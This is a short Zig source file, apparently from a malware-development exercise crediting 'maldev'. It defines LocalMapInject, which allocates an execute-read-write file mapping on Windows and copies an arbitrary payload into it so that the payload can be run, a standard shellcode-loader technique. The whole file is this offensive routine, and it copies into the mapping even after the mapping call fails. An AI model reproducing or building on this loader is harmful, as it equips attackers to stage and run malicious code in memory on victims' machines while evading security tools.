const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const LPVOID = windows.LPVOID;
const BOOL = windows.BOOL;
const kernel32 = windows.kernel32;
const INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;
const FILE_MAP_WRITE = 0x0002;
const FILE_MAP_EXECUTE = 0x0020;

// zig why you not including the windows api in the std lib? okay will do it myself! thats remind me old days of Delphi
extern "kernel32" fn CreateFileMappingW(
    hFile: windows.HANDLE,
    lpFileMappingAttributes: ?*anyopaque,
    flProtect: windows.DWORD,
    dwMaximumSizeHigh: windows.DWORD,
    dwMaximumSizeLow: windows.DWORD,
    lpName: ?[*:0]const u16,
) callconv(.winapi) ?windows.HANDLE;

extern "kernel32" fn MapViewOfFile(
    hFileMappingObject: windows.HANDLE,
    dwDesiredAccess: windows.DWORD,
    dwFileOffsetHigh: windows.DWORD,
    dwFileOffsetLow: windows.DWORD,
    dwNumberOfBytesToMap: windows.SIZE_T,
) callconv(.winapi) ?*anyopaque;

extern "kernel32" fn CloseHandle(hObject: windows.HANDLE) callconv(.winapi) windows.BOOL;

pub fn LocalMapInject(pPayload: [*]const u8, sPayloadSize: usize, ppAddress: *?*anyopaque) bool {

    // thanks to maldev!
    var bSTATE: bool = true;
    var hFile: ?windows.HANDLE = undefined;
    var pMapAddress: ?*anyopaque = undefined;
    // std.debug.print(" payload size here valu: {}\n", .{sPayloadSize});
    // Create a file mapping handle with `RWX` memory permissions
    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, null, windows.PAGE_EXECUTE_READWRITE, 0, @intCast(sPayloadSize), null);
    if (hFile == null) {
        std.debug.print("[!] CreateFileMapping Failed With Error : {}\n", .{kernel32.GetLastError()});
        bSTATE = false;
    } else {
        // Map the view of the payload to the memory
        pMapAddress = MapViewOfFile(hFile.?, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sPayloadSize);
        if (pMapAddress == null) {
            std.debug.print("[!] MapViewOfFile Failed With Error : {}\n", .{kernel32.GetLastError()});
            bSTATE = false;
        }
        std.debug.print("[i] pMapAddress : 0x{*}\n", .{pMapAddress});

        // std.debug.print("[#] Press <Enter> To Copy The Payload ... ", .{});
        //  _ = std.io.getStdIn().reader().readByte() catch |err| {
        //      std.debug.print("Error reading input: {}\n", .{err});
        //       //     bSTATE = false;
        //   };

        //if (bSTATE) {
        //  std.debug.print("[i] Copying Payload To 0x{?} ... ", .{pMapAddress});
        //@memcpy(@as([*]u8, @ptrCast(pMapAddress.?))[0..sPayloadSize], pPayload[0..sPayloadSize]);

        @memcpy(@as([*]u8, @ptrCast(pMapAddress)), pPayload[0..sPayloadSize]);

        // std.debug.print("[+] DONE\n", .{});
        // }
    }
    // std.debug.print("FinalpMapAddress value: 0x{*}\n", .{pMapAddress});

    ppAddress.* = pMapAddress;

    if (hFile) |handle| {
        _ = CloseHandle(handle);
    }
    return bSTATE;
}
